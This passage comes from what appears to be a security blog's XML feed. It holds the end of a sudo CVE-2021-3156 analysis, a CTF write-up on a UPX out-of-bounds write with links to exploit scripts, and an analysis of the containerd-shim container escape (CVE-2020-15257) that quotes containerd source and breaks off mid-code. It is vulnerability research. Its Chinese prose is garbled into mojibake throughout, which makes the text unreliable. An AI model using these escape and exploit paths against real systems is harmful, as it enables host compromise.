åœ°å€ä¸ºè¦è¢«è¦†ç›–çš„ç›®æ ‡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p&#x2F;x 0x5555555891e0 - 0x555555588bc0</span><br><span class="line">$1 &#x3D; 0x620</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¿™æ ·çš„æ–¹æ³•æ¥æŸ¥çœ‹ä¸¤è€…çš„åç§»</p><p>æœ€åçš„åˆ©ç”¨è§ <a href="https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9">https://gist.github.com/WinMin/9607a076d847f5768f372988762638f9</a></p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201155514383.png" title="image-20210201155514383" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201155514383.png" alt="image-20210201155514383"></a></p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://visualgdb.com/gdbreference/commands/set_stop-on-solib-events">https://visualgdb.com/gdbreference/commands/set_stop-on-solib-events</a></p><p><a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</a></p><p><a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2021-3156 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RWCTF-3rd JunkAV writeup</title>
      <link href="RWCTF-3rd-writeup.html"/>
      <url>RWCTF-3rd-writeup.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>I made a challenge name <a href="https://github.com/chaitin/Real-World-CTF-3rd-Challenge-Attachments/tree/main/JunkAV">JunkAV</a> for RWCTF 3rd .  This is an oob write vulnerability caused by a upx processing PE program.  Congratulations to CodeR00t and 217 who solved it during the game.</p><blockquote><p>Thank <a href="https://twitter.com/leommxj">@leommxj</a> for contributing to this challenge</p></blockquote><h3 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h3><p>Vulnerability is in the PeFile::rebuildRelocs function of pefile.cpp in upx 3.96 .</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152651.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152651.png"></a></p><p>When calling the unoptimizeReloc function</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152714.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111152714.png"></a></p><ol><li>The size of the relocn can be controlled by the user, so the allocation size can be controlled.</li><li>The 1024-1033 guild will flip the data.</li><li>When the data is flipped later, the <code>jc</code> variable on line 1021 becomes controllable, and finally the oob write is completed on line 1023</li></ol><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><ul><li><p>generated upx compressed program :</p><p>â€‹        <a href="http://bestwing.me/attachments/rwctf-3rd/JunkAV/gen_exploit_bin.py">http://bestwing.me/attachments/rwctf-3rd/JunkAV/gen_exploit_bin.py</a></p></li><li><p>ibuf_mod :</p><p>â€‹        <a href="http://bestwing.me/attachments/rwctf-3rd/JunkAV/ibuf_mod">http://bestwing.me/attachments/rwctf-3rd/JunkAV/ibuf_mod</a></p></li><li><p>IO script:</p><p>â€‹        <a href="http://bestwing.me/attachments/rwctf-3rd/JunkAV/exploit.py">http://bestwing.me/attachments/rwctf-3rd/JunkAV/exploit.py</a></p></li></ul><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111155913.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20210111155913.png"></a></p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://landave.io/2020/11/bitdefender-upx-unpacking-featuring-ten-memory-corruptions/">https://landave.io/2020/11/bitdefender-upx-unpacking-featuring-ten-memory-corruptions/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-15257 Docker é€ƒé€¸æ¼æ´åˆ†æ</title>
      <link href="CVE-2020-15257-anaylysis.html"/>
      <url>CVE-2020-15257-anaylysis.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="CVE-2020-15257ï¼ˆDocker-å®¹å™¨é€ƒé€¸ï¼‰"><a href="#CVE-2020-15257ï¼ˆDocker-å®¹å™¨é€ƒé€¸ï¼‰" class="headerlink" title="CVE-2020-15257ï¼ˆDocker å®¹å™¨é€ƒé€¸ï¼‰"></a>CVE-2020-15257ï¼ˆDocker å®¹å™¨é€ƒé€¸ï¼‰</h2><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>2020/11/30ï¼Œå…¬å¼€äº† <a href="https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4"><strong>CVE-2020-15257</strong></a> çš„ç»†èŠ‚ã€‚è¯¥æ¼æ´å½±å“ containerd 1.3.x, 1.2.x, 1.4.x ç‰ˆæœ¬</p><p>ç”±äºåœ¨ host æ¨¡å¼ä¸‹ï¼Œå®¹å™¨ä¸ <strong>host</strong> å…±äº«ä¸€å¥— <strong>Network namespaces</strong> ï¼Œæ­¤æ—¶ <strong>containerd-shim API</strong> æš´éœ²ç»™äº†ç”¨æˆ·ï¼Œè€Œä¸”è®¿é—®æ§åˆ¶ä»…ä»…éªŒè¯äº†è¿æ¥è¿›ç¨‹çš„æœ‰æ•ˆUIDä¸º0ï¼Œä½†æ²¡æœ‰é™åˆ¶å¯¹æŠ½è±¡UnixåŸŸå¥—æ¥å­—çš„è®¿é—®ã€‚æ‰€ä»¥å½“ä¸€ä¸ªå®¹å™¨ä¸º root æƒé™ï¼Œä¸”å®¹å™¨çš„ç½‘ç»œæ¨¡å¼ä¸º <code>--net=host</code> çš„æ—¶å€™ï¼Œé€šè¿‡ <strong>ontainerd-shim API</strong>  å¯ä»¥è¾¾æˆå®¹å™¨é€ƒé€¸çš„ç›®çš„</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/IwGn4bPEFWTY15f.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/IwGn4bPEFWTY15f.png"></a></p><h3 id="containerd-shim"><a href="#containerd-shim" class="headerlink" title="containerd-shim"></a>containerd-shim</h3><p>åœ¨è¿›ä¸€æ­¥äº†è§£æ¼æ´åŸç†ä¹‹å‰ï¼Œ æˆ‘ä»¬éœ€è¦äº†è§£ä¸€ä¸‹å•Š <strong>containerd-shim</strong> æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>åœ¨ 1.11 ç‰ˆæœ¬ä¸­ï¼ŒDocker è¿›è¡Œäº†é‡å¤§çš„é‡æ„ï¼Œç”±å•ä¸€çš„ Docker Daemonï¼Œæ‹†åˆ†æˆäº† 4 ä¸ªç‹¬ç«‹çš„æ¨¡å—ï¼šDocker Daemonã€containerdã€containerd-shimã€runC</p><p>å…¶ä¸­ï¼Œcontainerd æ˜¯ç”± Docker Daemon ä¸­çš„å®¹å™¨è¿è¡Œæ—¶åŠå…¶ç®¡ç†åŠŸèƒ½å‰¥ç¦»äº†å‡ºæ¥ã€‚docker å¯¹å®¹å™¨çš„ç®¡ç†å’Œæ“ä½œåŸºæœ¬éƒ½æ˜¯é€šè¿‡ containerd å®Œæˆçš„ã€‚</p><p>å®ƒå‘ä¸Šä¸º Docker Daemon æä¾›äº† gRPC æ¥å£ï¼Œå‘ä¸‹é€šè¿‡ containerd-shim ç»“åˆ runCï¼Œå®ç°å¯¹å®¹å™¨çš„ç®¡ç†æ§åˆ¶ã€‚containerd è¿˜æä¾›äº†å¯ç”¨äºä¸å…¶äº¤äº’çš„ API å’Œå®¢æˆ·ç«¯åº”ç”¨ç¨‹åº ctrã€‚æ‰€ä»¥å®é™…ä¸Šï¼Œå³ä½¿ä¸è¿è¡Œ Docker Daemonï¼Œä¹Ÿèƒ½å¤Ÿç›´æ¥é€šè¿‡ containerd æ¥è¿è¡Œã€ç®¡ç†å®¹å™¨ã€‚</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/q1ecxzGh9r72yM8.png" title="image-20201206002348825" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/q1ecxzGh9r72yM8.png" alt="image-20201206002348825" style="zoom:50%;" /></a><p>â€‹    </p><p>è€Œä¸­é—´çš„ <strong>containerd-shim</strong> å¤¹æ‚åœ¨ containerd å’Œ runc ä¹‹é—´ï¼Œæ¯æ¬¡å¯åŠ¨ä¸€ä¸ªå®¹å™¨ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ containerd-shim è¿›ç¨‹ï¼Œå®ƒé€šè¿‡æŒ‡å®šçš„ä¸‰ä¸ªå‚æ•°ï¼šå®¹å™¨ idã€bundle ç›®å½•ã€è¿è¡Œæ—¶äºŒè¿›åˆ¶æ–‡ä»¶è·¯å¾„ï¼Œæ¥è°ƒç”¨è¿è¡Œæ—¶çš„ API åˆ›å»ºã€è¿è¡Œå®¹å™¨ï¼ŒæŒç»­å­˜åœ¨åˆ°å®¹å™¨å®ä¾‹è¿›ç¨‹é€€å‡ºä¸ºæ­¢ï¼Œå°†å®¹å™¨çš„é€€å‡ºçŠ¶æ€åé¦ˆç»™ containerd</p><p>å…³äº <strong>containerd-shim</strong> çš„ä½œç”¨ç»†èŠ‚å¯ä»¥å‚è€ƒä½œè€…çš„ <a href="https://github.com/crosbymichael/dockercon-2016/blob/master/Creating%20Containerd.pdf">slide</a></p><p>æœ€ç»ˆ ** containerd-shim ** åˆ›å»ºçš„å®¹å™¨çš„æ“ä½œå…¶å®è¿˜æ˜¯è½å®åˆ°äº† <strong>runc</strong> ä¸Šï¼Œ è€Œä¼—æ‰€å‘¨çŸ¥<strong>runC</strong> æ˜¯ä¸€ä¸ªæ ¹æ® OCI ï¼ˆOpen Container Initiativeï¼‰æ ‡å‡†åˆ›å»ºå¹¶è¿è¡Œå®¹å™¨çš„ CLI toolã€‚</p><h3 id="æ¼æ´åŸå› "><a href="#æ¼æ´åŸå› " class="headerlink" title="æ¼æ´åŸå› "></a>æ¼æ´åŸå› </h3><p>æ¼æ´åŸå› åœ¨å‰è¨€éƒ¨åˆ†å·²ç»å†™å¾—å¾ˆæ¸…æ¥šäº†ï¼Œè¯´ç™½äº†å°±è¯´ æš´éœ²äº†ä¸è¯¥æœ‰çš„ API æ¥å£ï¼Œè€Œ   <strong>containerd-shim</strong>  çš„ API æ¥å£ç”± Unix åŸŸå¥—æ¥å­— å®ç°ã€‚ä»£ç å®ç°ä½äº</p><p><a href="https://github.com/containerd/containerd/blob/b321d358e6eef9c82fa3f3bb8826dca3724c58c6/runtime/v1/linux/bundle.go#L136">https://github.com/containerd/containerd/blob/b321d358e6eef9c82fa3f3bb8826dca3724c58c6/runtime/v1/linux/bundle.go#L136</a></p><p>å®é™…ä¸Šåœ¨ï¼Œ docker å®¹å™¨ä¸­ï¼ˆä»¥ â€“net=host è¿è¡Œ),   <strong>containerd-shim</strong>   API å¤§æ¦‚é•¿è¿™æ ·</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20201206003829351.png" title="image-20201206003829351" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20201206003829351.png" alt="image-20201206003829351"></a></p><blockquote><p><strong>1)/var/run/docker.sock</strong>ï¼šDocker Daemon ç›‘å¬çš„ Unix åŸŸå¥—æ¥å­—ï¼Œç”¨äº Docker client ä¹‹é—´é€šä¿¡ï¼›</p><p><strong>2)/run/containerd/containerd.sock</strong>ï¼šcontainerd ç›‘å¬çš„ Unix åŸŸå¥—æ¥å­—ï¼ŒDocker Daemonã€ctr å¯ä»¥é€šè¿‡å®ƒå’Œ containerd é€šä¿¡ï¼›</p><p><strong>3)@/containerd-shim/3d6a9ed878c586fd715d9b83158ce32b6109af11991bfad4cf55fcbdaf6fee76.sock</strong>ï¼š</p><p>è¿™ä¸ªå°±æ˜¯ä¸Šæ–‡æ‰€è¿°çš„ï¼Œcontainerd-shim ç›‘å¬çš„ Unix åŸŸå¥—æ¥å­—ï¼Œcontainerd é€šè¿‡å®ƒå’Œ containerd-shim é€šä¿¡ï¼Œæ§åˆ¶ç®¡ç†å®¹å™¨ã€‚</p><p>/var/run/docker.sockã€/run/containerd/containerd.sock è¿™ä¸¤è€…æ˜¯æ™®é€šçš„æ–‡ä»¶è·¯å¾„ï¼Œè™½ç„¶å®¹å™¨å…±äº«äº†ä¸»æœºçš„ç½‘ç»œå‘½åç©ºé—´ï¼Œä½†æ²¡æœ‰å…±äº« mnt å‘½åç©ºé—´ï¼Œå®¹å™¨å’Œä¸»æœºä¹‹é—´çš„ç£ç›˜æŒ‚è½½ç‚¹å’Œæ–‡ä»¶ç³»ç»Ÿä»ç„¶å­˜åœ¨éš”ç¦»ï¼Œæ‰€ä»¥åœ¨å®¹å™¨å†…éƒ¨ä¹‹é—´ä»ç„¶ä¸èƒ½é€šè¿‡ /var/run/docker.sockã€/run/containerd/containerd.sock è¿™æ ·çš„è·¯å¾„è¿æ¥å¯¹åº”çš„ Unix åŸŸå¥—æ¥å­—ã€‚</p><p>ä½†æ˜¯ @/containerd-shim/{sha256}.sock è¿™ä¸€ç±»çš„æŠ½è±¡ Unix åŸŸå¥—æ¥å­—ä¸ä¸€æ ·ï¼Œå®ƒæ²¡æœ‰ä¾é  mnt å‘½åç©ºé—´åšéš”ç¦»ï¼Œè€Œæ˜¯ä¾é ç½‘ç»œå‘½åç©ºé—´åšéš”ç¦»ã€‚</p></blockquote><p>containerd ä¼ é€’ Unix åŸŸå¥—æ¥å­—æ–‡ä»¶æè¿°ç¬¦ç»™ <strong>containerd-shim</strong>ã€‚<strong>containerd-shim</strong> åœ¨æ­£å¼å¯åŠ¨ä¹‹åï¼Œä¼šåŸºäºçˆ¶è¿›ç¨‹ï¼ˆä¹Ÿå°±æ˜¯ containerdï¼‰ä¼ é€’çš„ Unix åŸŸå¥—æ¥å­—æ–‡ä»¶æè¿°ç¬¦ï¼Œå»ºç«‹ gRPC æœåŠ¡ï¼Œå¯¹å¤–æš´éœ²ä¸€äº› API ç”¨äº containerã€task çš„æ§åˆ¶ï¼š</p><p>é€šè¿‡æŸ¥é˜…ä»£ç ï¼Œæˆ‘ä»¬å¤§æ¦‚çŸ¥é“æˆ‘ä»¬å¦‚æœèƒ½æ­£å¸¸è®¿é—® <strong>containerd-shim</strong> æ¥å£ï¼Œæˆ‘ä»¬å¤§æ¦‚èƒ½æœ‰è¿™äº›æ“ä½œ</p><p><a href="https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/shim/v1/shim.proto">https://github.com/containerd/containerd/blob/v1.4.2/runtime/v1/shim/v1/shim.proto</a></p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">service</span> <span class="title">Shim</span> </span>&#123;</span><br><span class="line"><span class="comment">// State returns shim and task state information.</span></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> State(StateRequest) <span class="keyword">returns</span> (StateResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Create(CreateTaskRequest) <span class="keyword">returns</span> (CreateTaskResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Start(StartRequest) <span class="keyword">returns</span> (StartResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Delete(google.protobuf.Empty) <span class="keyword">returns</span> (DeleteResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> DeleteProcess(DeleteProcessRequest) <span class="keyword">returns</span> (DeleteResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> ListPids(ListPidsRequest) <span class="keyword">returns</span> (ListPidsResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Pause(google.protobuf.Empty) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Resume(google.protobuf.Empty) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Checkpoint(CheckpointTaskRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Kill(KillRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Exec(ExecProcessRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> ResizePty(ResizePtyRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> CloseIO(CloseIORequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ShimInfo returns information about the shim.</span></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> ShimInfo(google.protobuf.Empty) <span class="keyword">returns</span> (ShimInfoResponse)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Update(UpdateTaskRequest) <span class="keyword">returns</span> (google.protobuf.Empty)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Wait(WaitRequest) <span class="keyword">returns</span> (WaitResponse)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™äº›æ¥å£ï¼Œä»åå­—åŸºæœ¬å¯ä»¥çŒœæµ‹ä¸å®¹å™¨ç®¡ç†è¯´æœ‰å…³ç³»çš„ï¼Œ æ¯”å¦‚     <code>Create</code> ã€<code>Start</code> ã€<code>Delete</code></p><p>é€šè¿‡æŸ¥çœ‹ä»£ç     </p><p><a href="https://github.com/containerd/containerd/blob/v1.4.2/vendor/github.com/containerd/ttrpc/unixcreds_linux.go#L80">https://github.com/containerd/containerd/blob/v1.4.2/vendor/github.com/containerd/ttrpc/unixcreds_linux.go#L80</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// UnixSocketRequireSameUser resolves the current effective unix user and returns aStephen J Day, 3 years ago: â€¢ vendor: update ttrpc to pull in euid change</span></span><br><span class="line"><span class="comment">// UnixCredentialsFunc that will validate incoming unix connections against the</span></span><br><span class="line"><span class="comment">// current credentials.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This is useful when using abstract sockets that are accessible by all users.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UnixSocketRequireSameUser</span><span class="params">()</span> <span class="title">UnixCredentialsFunc</span></span> &#123;</span><br><span class="line">euid, egid := os.Geteuid(), os.Getegid()</span><br><span class="line"><span class="keyword">return</span> UnixSocketRequireUidGid(euid, egid)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">requireRoot</span><span class="params">(ucred *unix.Ucred)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> requireUidGid(ucred, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">requireUidGid</span><span class="params">(ucred *unix.Ucred, uid, gid <span class="keyword">int</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> (uid != <span class="number">-1</span> &amp;&amp; <span class="keyword">uint32</span>(uid) != ucred.Uid) || (gid != <span class="number">-1</span> &amp;&amp; <span class="keyword">uint32</span>(gid) != ucred.Gid) &#123;</span><br><span class="line"><span class="keyword">return</span> errors.Wrap(syscall.EPERM, <span class="string">&quot;ttrpc: invalid credentials&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">requireUnixSocket</span><span class="params">(conn net.Conn)</span> <span class="params">(*net.UnixConn, error)</span></span> &#123;</span><br><span class="line">uc, ok := conn.(*net.UnixConn)</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">&quot;a unix socket connection is required&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> uc, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>UnixSocketRequireSameUser </code> ä»…ä»…æ£€æŸ¥äº†è®¿é—®è¿›ç¨‹çš„ euid å’Œ egid ï¼Œè€Œåœ¨é»˜è®¤æƒ…å†µä¸‹å®¹å™¨å†…éƒ¨çš„è¿›ç¨‹éƒ½æ˜¯ä»¥ root ç”¨æˆ·å¯åŠ¨ï¼Œæ‰€ä»¥è¿™ä¸ªé™åˆ¶å¯ä»¥å¿½ç•¥ä¸è®¡ã€‚</p><h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>æ¼æ´åˆ©ç”¨éœ€è¦æ„å»º <strong>gRPC</strong> ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥é˜…ä»£ç ï¼Œ æŸ¥çœ‹ <strong>ontainerd</strong> é¡¹ç›®å‘¢å…³äº <strong>shim-client</strong> æ˜¯å¦‚ä½•ç¼–å†™çš„</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// WithConnect connects to an existing shim</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">WithConnect</span><span class="params">(address <span class="keyword">string</span>, onClose <span class="keyword">func</span>()</span>) <span class="title">Opt</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">func</span><span class="params">(ctx context.Context, config shim.Config)</span> <span class="params">(shimapi.ShimService, io.Closer, error)</span></span> &#123;</span><br><span class="line">conn, err := connect(address, anonDialer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">client := ttrpc.NewClient(conn, ttrpc.WithOnClose(onClose))</span><br><span class="line"><span class="keyword">return</span> shimapi.NewShimClient(client), conn, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ ttrpc æ„å»º clientï¼Œæ­¤æ—¶ conn ä¸º unix å¥—å­—èŠ‚</p><p>ç„¶åè¿”å› client</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">... ...</span><br><span class="line">c, clo, err :&#x3D; WithConnect(address, func() &#123;&#125;)(ctx, config)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">return nil, nil, errors.Wrap(err, &quot;failed to connect&quot;)</span><br><span class="line">&#125;</span><br><span class="line">return c, clo, nil</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; ShimRemote is a ShimOpt for connecting and starting a remote shim</span><br><span class="line">func ShimRemote(c *Config, daemonAddress, cgroup string, exitHandler func()) ShimOpt &#123;</span><br><span class="line">return func(b *bundle, ns string, ropts *runctypes.RuncOptions) (shim.Config, client.Opt) &#123;</span><br><span class="line">config :&#x3D; b.shimConfig(ns, c, ropts)</span><br><span class="line">return config,</span><br><span class="line">client.WithStart(c.Shim, b.shimAddress(ns, daemonAddress), daemonAddress, cgroup, c.ShimDebug, exitHandler)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(r *Runtime)</span> <span class="title">Create</span><span class="params">(ctx context.Context, id <span class="keyword">string</span>, opts runtime.CreateOpts)</span> <span class="params">(_ runtime.Task, err error)</span></span> &#123;</span><br><span class="line">namespace, err := namespaces.NamespaceRequired(ctx)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := identifiers.Validate(id); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errors.Wrapf(err, <span class="string">&quot;invalid task id&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ropts, err := r.getRuncOptions(ctx, id)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> 